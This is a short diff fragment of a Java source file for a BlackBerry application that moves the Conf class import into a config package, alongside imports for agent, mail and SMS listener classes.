@@ -14,11 +14,11 @@ import java.util.Vector;
 
 import net.rim.device.api.util.IntHashtable;
 import blackberry.AgentManager;
-import blackberry.Conf;
 import blackberry.Status;
 import blackberry.agent.mail.Filter;
 import blackberry.agent.mail.MailListener;
 import blackberry.agent.sms.SmsListener;
+import blackberry.config.Conf;
 import blackberry.config.Keys;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
